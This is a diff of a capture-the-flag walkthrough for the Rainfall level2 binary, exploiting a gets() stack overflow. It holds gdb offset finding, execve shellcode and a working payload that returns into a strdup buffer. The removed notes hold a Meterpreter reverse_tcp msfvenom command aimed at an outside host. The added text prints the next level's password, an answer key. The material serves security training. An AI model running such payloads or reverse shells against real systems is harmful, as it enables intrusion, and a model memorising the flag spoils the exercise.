@@ -1,81 +1,68 @@
-msf-pattern_create -l 2000 > find_pattern
+# Rainfall - Level2 Walkthrough
 
-gdb level2 
-<input the content of find_pattern>
+A single binary is present in `/home/user/level2`. Listing it shows it is owned by `level2`. Copy it locally for analysis:
 
-Program received signal SIGSEGV, Segmentation fault.
-0x37634136 in ?? ()
+```bash
+scp -P 4242 level2@{IP}:/home/user/level2/level2 .
+```
 
-EIP -> 0x37634136
+**Step 1**  
+Open the binary in Ghidra.
 
-msf-pattern_offset -l 2000 -q 0x37634136 
-[*] Exact match at offset 80
+**Step 2**  
+Locate the `main` function. It's calling p(). Go into p() and see what it does. It has a `gets` call.
 
-Then we will craft a reverse shell
+**Step 3**
+We know `gets` like in the level1 is unsafe. So we try to find the offset to overwrite the return address. We can use gdb to help us find it.
 
-In Kali, we run
+```bash
+(gdb) run <<< $(python -c "print 'A'*80")
+(gdb) info registers
+ebp            0x41414141       0x41414141
+eip            0xb7ea912f       0xb7ea912f
+```
 
-msfconsole
+So we see that EIP is not overwritten yet. We try with 84 bytes.
 
-Then 
+```bash
+(gdb) run <<< $(python -c "print 'A'*80 + 'B'*4")
+(gdb) info registers
+ebp            0x41414141       0x41414141
+eip            0x42424242       0x42424242
+```
 
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.200.17 LPORT=4545 -f elf > shellcode.bin
+So we know the offset is 80 bytes. And the 4 bytes after that overwrite the return address.
 
-printf 'A%.0s' {1..80} > padding.bin
+**Step 4**
+Unlike the level1, there is no function that spawns a shell. So we need to find another way to get a shell. The way is creating a shellcode and injecting it into the buffer with strdup. And then overwrite the return address to point to the buffer.
 
-cat padding.bin shellcode.bin > payload.bin
+The shellcode to spawn a shell in Linux x86, source https://www.exploit-db.com/exploits/46907 :
 
+"\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 
-printf "0x%x\n" $((0x37634136 + 80))
->> 0x37634186
+The padding we need to add is of size of size 80 - len(shellcode) == 80 - 21 = 59
+So the payload is going to be padding + shellcode + return address.
+we can find the strdup buffer address by doing this :
 
-37 63 41 86
-86 41 63 37
+```bash
+echo "test" | ltrace ./level2
+strdup("test") = 0x0804a008
+```
 
-0x86416337
-b'\x86\x41\x63\x37'
+\x08\xa0\x04\x08' is the little endian for 0x0804a008
 
-cat padding.bin shellcode.bin > payload.bin; echo b'\x86\x41\x63\x37' >> payload.bin
+**step 5**
+Create the payload and run the binary with it.
 
+```bash
+python -c "print '\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'A'*59 + '\x08\xa0\x04\x08'" > /tmp/payload
+cat /tmp/payload - | ./level2
+1�j
+   X�Rh//shh/bin��̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
 
-
-----
-
-gdb ./level2 
-set disassembly-flavor intel
-disas p
-
->> 0x0804853d <+105>:	leave
-
-b *0x0804853d
-
-run
-
-info register
-
-eax            0x804a9c0           134523328
-
-0x08 04 b5 c0
-  c0 b5 04 08
-
-
-0x08 04 a0 08
-0x08a00408
-
-b'\x08\xa0\x04\x08'
-
-SHELLCODE found on https://www.kernel-panic.it/security/shellcode/shellcode5.html
-
-"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46"
-"\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
-"\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
-
-\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
-
-
- echo -n b'\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' > toto ; ls -l toto
-
-
-python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A'*58 + '\x08\xa0\x04\x08')" > /tmp/payload.bin
-
-(cat /tmp/payload.bin; cat) | ./level2
+Use that shell to read `/home/user/level2/.pass`.
